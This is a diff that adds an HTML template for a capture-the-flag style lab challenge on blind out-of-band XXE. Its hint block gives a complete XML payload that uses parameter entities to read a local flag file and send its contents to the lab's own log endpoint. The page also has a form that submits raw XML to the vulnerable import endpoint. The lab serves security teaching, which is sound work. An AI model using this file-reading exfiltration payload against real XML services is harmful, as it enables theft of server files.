@@ -1,0 +1,63 @@
+{% extends "base.html" %}
+{% block title %}NeonParser — Blind XXE{% endblock %}
+{% block content %}
+<h1>Challenge 2 &mdash; Blind XXE (OOB)</h1>
+<p style="color: var(--text-muted); margin-bottom: 1.5rem;">
+    The import endpoint processes XML but does NOT return entity values. You must exfiltrate data out-of-band.
+</p>
+
+<div class="card">
+    <h3>Hint</h3>
+    <p style="color: var(--text-muted); font-size: .85rem;">
+        Use parameter entities to read <code>/app/flag2.txt</code> and send it to <code>/log?data=...</code>. Then check <a href="/log-view">/log-view</a>.
+    </p>
+    <div class="code-block">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///app/flag2.txt"&gt;
+  &lt;!ENTITY % exfil SYSTEM "http://127.0.0.1:5012/log?data=%file;"&gt;
+  %exfil;
+]&gt;
+&lt;data&gt;test&lt;/data&gt;</div>
+</div>
+
+<div class="card">
+    <form id="xml-form">
+        <label for="xml-input">XML Payload</label>
+        <textarea id="xml-input" name="xml" placeholder="Enter your XML here...">&lt;?xml version="1.0"?&gt;
+&lt;data&gt;Import test&lt;/data&gt;</textarea>
+        <button type="submit">Import XML</button>
+    </form>
+</div>
+
+{% if error %}
+<div class="alert alert-error">{{ error }}</div>
+{% endif %}
+
+{% if status %}
+<div class="alert alert-success">{{ status }}</div>
+{% endif %}
+
+<div id="output"></div>
+
+<p style="margin-top: 1rem;"><a href="/log-view">View OOB Logs &rarr;</a></p>
+
+<script>
+document.getElementById('xml-form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const xml = document.getElementById('xml-input').value;
+    const resp = await fetch('/import', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/xml'},
+        body: xml
+    });
+    const html = await resp.text();
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    const success = doc.querySelector('.alert-success');
+    const alertError = doc.querySelector('.alert-error');
+    const output = document.getElementById('output');
+    output.innerHTML = '';
+    if (success) output.innerHTML = success.outerHTML;
+    if (alertError) output.innerHTML = alertError.outerHTML;
+});
+</script>
+{% endblock %}
